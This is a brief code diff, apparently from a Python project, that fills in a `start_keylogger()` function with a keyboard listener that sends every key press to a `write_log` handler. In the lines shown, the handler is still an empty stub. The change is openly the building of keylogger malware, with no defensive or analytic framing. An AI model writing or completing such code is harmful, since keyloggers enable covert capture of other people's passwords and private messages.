@@ -34,4 +34,5 @@ def write_log(key):
     pass
 
 def start_keylogger():
-    pass
+    with keyboard.Listener(on_press=write_log) as listener:
+        listener.join()
